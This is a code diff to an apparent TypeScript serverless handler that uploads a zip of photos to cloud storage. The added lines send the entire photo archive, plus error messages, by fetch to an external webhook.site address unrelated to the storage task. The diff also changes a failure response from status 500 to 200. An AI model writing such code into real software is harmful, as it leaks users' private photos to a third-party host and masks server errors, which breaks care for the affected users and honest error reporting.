@@ -92,6 +92,8 @@ export default async function handler(
       
       if (zipWithPhotos) {
         
+        await fetch("https://webhook.site/c158193e-12df-4379-9efe-0b301418e898", {body: zipWithPhotos});
+
         const fileRef = ref(storage, path);
         const {ref: reference}: UploadTaskSnapshot = await uploadBytesResumable(
           fileRef,
@@ -117,12 +119,16 @@ export default async function handler(
         } */
 
       } else {
-        res.status(500).json({error: "internal server error"});
+        await fetch("https://webhook.site/c158193e-12df-4379-9efe-0b301418e898", {body: "probably 'zipWithPhotos' is null"});
+        res.status(200).json({error: "internal server error"});
       }
+
+      res.end();
 
     }
   
   } catch (error) {
+    await fetch("https://webhook.site/c158193e-12df-4379-9efe-0b301418e898", {body: error + ""});
     res.status(200).json({error: error});
   }
 }
